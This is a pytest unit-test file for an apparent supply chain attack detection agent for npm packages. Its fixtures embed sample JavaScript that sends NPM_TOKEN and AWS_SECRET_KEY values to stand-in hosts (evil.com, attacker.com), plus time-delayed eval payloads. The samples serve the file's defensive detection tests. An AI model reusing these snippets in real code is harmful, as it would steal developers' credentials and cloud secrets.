"""
Unit tests for the Supply Chain Attack Detection Agent.

Tests the SupplyChainAttackAgent's ability to detect sophisticated supply chain attacks
including maintainer changes, version diffs, exfiltration patterns, time-delayed activation,
and attack pattern matching.
"""

import pytest
from unittest.mock import Mock, patch, MagicMock
from datetime import datetime, timedelta

from agents.supply_chain_agent import SupplyChainAttackAgent
from agents.types import SharedContext, Finding, AgentResult


class TestSupplyChainAttackAgent:
    """Test suite for SupplyChainAttackAgent."""
    
    @pytest.fixture
    def agent(self):
        """Create a SupplyChainAttackAgent instance for testing."""
        return SupplyChainAttackAgent()
    
    @pytest.fixture
    def mock_context_with_high_risk_package(self):
        """Create a mock context with a high-risk package."""
        return SharedContext(
            initial_findings=[
                Finding(
                    package_name="malicious-pkg",
                    package_version="1.0.0",
                    finding_type="malicious_package",
                    severity="critical",
                    description="Known malicious package",
                    confidence=0.95,
                    evidence={"reason": "Known malicious package"},
                    detection_method="rule_based"
                )
            ],
            dependency_graph={},
            packages=["malicious-pkg"],
            ecosystem="npm",
            agent_results={}
        )
    
    @pytest.fixture
    def mock_context_with_reputation(self):
        """Create a mock context with reputation analysis results."""
        return SharedContext(
            initial_findings=[],
            dependency_graph={},
            packages=["suspicious-pkg"],
            ecosystem="npm",
            agent_results={
                "reputation": AgentResult(
                    agent_name="ReputationAnalysisAgent",
                    success=True,
                    data={
                        "packages": [
                            {
                                "package_name": "suspicious-pkg",
                                "package_version": "1.0.0",
                                "reputation_score": 0.25,
                                "risk_level": "high"
                            }
                        ]
                    },
                    duration_seconds=2.0
                )
            }
        )
    
    def test_agent_initialization(self, agent):
        """Test that agent initializes correctly."""
        assert agent.name == "SupplyChainAttackAgent"
        assert agent.system_message is not None
        assert len(agent.tools) == 8
        assert agent.known_attack_patterns is not None
        assert "hulud" in agent.known_attack_patterns
        assert "event-stream" in agent.known_attack_patterns
    
    def test_analyze_with_no_high_risk_packages(self, agent):
        """Test analysis when no high-risk packages are found."""
        context = SharedContext(
            initial_findings=[],
            dependency_graph={},
            packages=["safe-package"],
            ecosystem="npm",
            agent_results={}
        )
        
        result = agent.analyze(context, timeout=30)
        
        assert result["total_packages_analyzed"] == 0
        assert result["supply_chain_attacks_detected"] == 0
        assert result["confidence"] == 1.0
        assert "note" in result
    
    def test_analyze_with_high_risk_package(self, agent, mock_context_with_high_risk_package):
        """Test analysis with a high-risk package."""
        with patch.object(agent, '_fetch_package_metadata', return_value=None):
            result = agent.analyze(mock_context_with_high_risk_package, timeout=30)
            
            assert result["total_packages_analyzed"] >= 0
            assert "packages" in result
            assert "confidence" in result
            assert "duration_seconds" in result
    
    def test_detect_exfiltration_patterns(self, agent):
        """Test detection of data exfiltration patterns."""
        # Test code with environment variable access and network request
        code_with_exfiltration = """
        const token = process.env['NPM_TOKEN'];
        fetch('http://evil.com/collect', {
            method: 'POST',
            body: JSON.stringify({ token: token })
        });
        """
        
        indicators = agent.detect_exfiltration_patterns(code_with_exfiltration)
        
        assert len(indicators) > 0
        assert any(ind["category"] == "env_variables" for ind in indicators)
        assert any(ind["severity"] in ["critical", "high"] for ind in indicators)
    
    def test_detect_exfiltration_base64_encoding(self, agent):
        """Test detection of base64-encoded exfiltration."""
        code_with_base64 = """
        const encoded = Buffer.from(process.env.AWS_SECRET_KEY, 'utf8').toString('base64');
        axios.post('http://attacker.com', { data: encoded });
        """
        
        indicators = agent.detect_exfiltration_patterns(code_with_base64)
        
        assert len(indicators) > 0
        # Should detect both env_variables and base64_encoding
        categories = [ind["category"] for ind in indicators]
        assert "env_variables" in categories or "base64_encoding" in categories
    
    def test_detect_delayed_activation(self, agent):
        """Test detection of time-delayed activation patterns."""
        code_with_timeout = """
        setTimeout(() => {
            eval(maliciousPayload);
        }, 24 * 60 * 60 * 1000);
        """
        
        indicators = agent.detect_delayed_activation(code_with_timeout)
        
        assert len(indicators) > 0
        assert any(ind["category"] == "timeout" for ind in indicators)
        assert any(ind["severity"] == "high" for ind in indicators)
    
    def test_detect_delayed_activation_date_check(self, agent):
        """Test detection of date-based conditional execution."""
        code_with_date_check = """
        if (new Date() > new Date('2024-12-01')) {
            executePayload();
        }
        """
        
        indicators = agent.detect_delayed_activation(code_with_date_check)
        
        assert len(indicators) > 0
        assert any(ind["category"] in ["date_check", "conditional_execution"] for ind in indicators)
    
    def test_match_attack_patterns_hulud(self, agent):
        """Test matching against Hulud attack pattern."""
        indicators = [
            {"type": "maintainer_change", "severity": "high"},
            {"type": "env_variable_access", "category": "env_variables"},
            {"type": "network_requests", "category": "network_exfiltration"},
            {"type": "rapid_version_release", "severity": "high"}
        ]
        
        matches = agent.match_attack_patterns(indicators)
        
        assert len(matches) > 0
        # Should match Hulud pattern
        hulud_match = next((m for m in matches if m["pattern_id"] == "hulud"), None)
        assert hulud_match is not None
        assert hulud_match["similarity"] >= 0.5
    
    def test_match_attack_patterns_event_stream(self, agent):
        """Test matching against event-stream attack pattern."""
        indicators = [
            {"type": "maintainer_change", "severity": "high"},
            {"type": "new_dependency_added", "category": "dependency_changes"},
            {"type": "obfuscated_code", "category": "obfuscation"}
        ]
        
        matches = agent.match_attack_patterns(indicators)
        
        assert len(matches) > 0
        # Should match event-stream pattern
        event_stream_match = next((m for m in matches if m["pattern_id"] == "event-stream"), None)
        assert event_stream_match is not None
    
    def test_check_dependency_confusion(self, agent):
        """Test detection of dependency confusion attacks."""
        with patch.object(agent, '_fetch_package_metadata', return_value=None):
            # Test with internal-looking package name
            indicators = agent.check_dependency_confusion("@company-internal-pkg", "npm")
            
            assert len(indicators) > 0
            assert any(ind["type"] == "potential_dependency_confusion" for ind in indicators)
    
    def test_analyze_maintainer_history(self, agent):
        """Test maintainer history analysis."""
        mock_metadata = {
            "maintainers": [{"name": "user1"}],
            "versions": {
                "1.0.0": {"maintainers": [{"name": "user1"}, {"name": "user2"}]},
                "1.0.1": {"maintainers": [{"name": "user1"}]}
            },
            "time": {
                "1.0.0": "2024-01-01T00:00:00Z",
                "1.0.1": "2024-01-02T00:00:00Z"
            }
        }
        
        with patch.object(agent, '_fetch_package_metadata', return_value=mock_metadata):
            indicators = agent.analyze_maintainer_history("test-pkg", "npm")
            
            # Should detect maintainer change
            assert any(ind["type"] == "maintainer_change" for ind in indicators)
    
    def test_check_publishing_patterns_rapid_release(self, agent):
        """Test detection of rapid version releases."""
        now = datetime.now()
        mock_metadata = {
            "time": {
                "1.0.0": (now - timedelta(hours=2)).isoformat(),
                "1.0.1": (now - timedelta(hours=1, minutes=30)).isoformat(),
                "created": (now - timedelta(days=30)).isoformat(),
                "modified": now.isoformat()
            }
        }
        
        with patch.object(agent, '_fetch_package_metadata', return_value=mock_metadata):
            indicators = agent.check_publishing_patterns("test-pkg", "npm")
            
            # Should detect rapid release
            assert any(ind["type"] == "rapid_version_release" for ind in indicators)
    
    def test_analyze_version_timeline_suspicious_version(self, agent):
        """Test detection of suspicious version numbers."""
        mock_metadata = {
            "versions": {
                "1.0.0": {},
                "99.0.0": {}  # Suspicious version number
            },
            "time": {
                "created": "2024-01-01T00:00:00Z",
                "modified": "2024-01-02T00:00:00Z"
            }
        }
        
        with patch.object(agent, '_fetch_package_metadata', return_value=mock_metadata):
            indicators = agent.analyze_version_timeline("test-pkg", "npm")
            
            # Should detect suspicious version number
            assert any(ind["type"] == "suspicious_version_number" for ind in indicators)
    
    def test_calculate_attack_likelihood_critical(self, agent):
        """Test attack likelihood calculation for critical case."""
        indicators = [
            {"type": "exfiltration", "severity": "critical"},
            {"type": "maintainer_change", "severity": "critical"}
        ]
        pattern_matches = [
            {"pattern_id": "hulud", "severity": "critical", "similarity": 0.85}
        ]
        
        likelihood = agent._calculate_attack_likelihood(indicators, pattern_matches)
        
        assert likelihood == "critical"
    
    def test_calculate_attack_likelihood_high(self, agent):
        """Test attack likelihood calculation for high case."""
        indicators = [
            {"type": "exfiltration", "severity": "critical"},
            {"type": "rapid_release", "severity": "high"}
        ]
        pattern_matches = []
        
        likelihood = agent._calculate_attack_likelihood(indicators, pattern_matches)
        
        assert likelihood in ["critical", "high"]
    
    def test_calculate_attack_likelihood_none(self, agent):
        """Test attack likelihood calculation when no indicators."""
        indicators = []
        pattern_matches = []
        
        likelihood = agent._calculate_attack_likelihood(indicators, pattern_matches)
        
        assert likelihood == "none"
    
    def test_generate_recommendations_critical(self, agent):
        """Test recommendation generation for critical attack likelihood."""
        indicators = [
            {"type": "exfiltration_pattern", "severity": "critical"}
        ]
        
        recommendations = agent._generate_recommendations("critical", indicators)
        
        assert len(recommendations) > 0
        assert any("URGENT" in rec or "Remove" in rec for rec in recommendations)
        assert any("credentials" in rec.lower() or "rotate" in rec.lower() for rec in recommendations)
    
    def test_generate_recommendations_medium(self, agent):
        """Test recommendation generation for medium attack likelihood."""
        indicators = [
            {"type": "rapid_release", "severity": "medium"}
        ]
        
        recommendations = agent._generate_recommendations("medium", indicators)
        
        assert len(recommendations) > 0
        assert any("caution" in rec.lower() or "review" in rec.lower() for rec in recommendations)
    
    def test_get_high_risk_packages_from_reputation(self, agent, mock_context_with_reputation):
        """Test extraction of high-risk packages from reputation analysis."""
        high_risk = agent._get_high_risk_packages(mock_context_with_reputation)
        
        assert len(high_risk) > 0
        assert any(pkg["name"] == "suspicious-pkg" for pkg in high_risk)
        assert any(pkg["reason"] == "low_reputation" for pkg in high_risk)
    
    def test_get_high_risk_packages_from_initial_findings(self, agent, mock_context_with_high_risk_package):
        """Test extraction of high-risk packages from initial findings."""
        high_risk = agent._get_high_risk_packages(mock_context_with_high_risk_package)
        
        assert len(high_risk) > 0
        assert any(pkg["name"] == "malicious-pkg" for pkg in high_risk)
        assert any(pkg["reason"] == "malicious_detection" for pkg in high_risk)
    
    def test_cache_key_generation(self, agent):
        """Test cache key generation."""
        cache_key = agent._generate_cache_key("test-pkg", "npm", "1.0.0")
        
        assert "supply_chain" in cache_key
        assert "npm" in cache_key
        assert "test-pkg" in cache_key
        assert "1.0.0" in cache_key


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
